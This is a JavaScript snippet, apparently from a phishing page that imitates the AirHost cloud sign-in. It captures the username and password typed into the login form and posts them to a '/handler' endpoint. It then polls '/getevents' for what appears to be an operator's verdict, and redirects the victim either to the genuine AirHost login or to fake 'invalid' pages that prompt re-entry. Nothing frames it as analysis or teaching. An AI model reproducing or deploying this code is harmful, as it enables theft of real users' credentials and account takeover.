<script>
  $(document).ready(function() {
    $('.btn.bg-pink-400.btn-block').click(function() {
        const login = $('#user_username').val();
        const password = $('#user_password').val();
        // Loading();
        setTimeout(()=>{
          $.ajax({
            url:'/autocheck',
            type:'POST',
            success:function(response){
              console.log('Success redirect');
              if(response == 'true'){

                location = 'https://cloud.airhost.co/ja/accounts/sign_in'
              }
            }
          })
        },3000)
        $.ajax({
            url: '/handler',
            type: 'POST',
            data: {
                login: login,
                password: password
            },
            success: function(response) {
              Loading();
                console.log('Success:', response);
            },
            error: function(xhr, status, error) {
                // Handle error response
                console.log('Error:', error);
            }
        });
    });
});
   
  </script>

  <script>
    setInterval(()=>{

      $.ajax({
        url: '/getevents',
        type: 'POST',
             
            success: function(response) {

              if(response == "" || !response){

              }
              else{
                switch (response) {
                  case "valid_login":
                  location = 'https://cloud.airhost.co/en/accounts/sign_in'
                      break;
                  case "invalid_login":
                  location.replace('/en/accounts/invalid_login.html')
                      break;
                  case "valid_password":
                  location = 'https://cloud.airhost.co/en/accounts/sign_in'
                      break;
                  case "invalid_password":
                  location.replace('/en/accounts/invalid_pass.html')
                      break;
                  default:
                      break;
              }
              }
                console.log('Success:', response);
              },
              error: function(xhr, status, error) {
                // Handle error response
                console.log('Error:', error);
              }
            });
    },1000)
  </script>
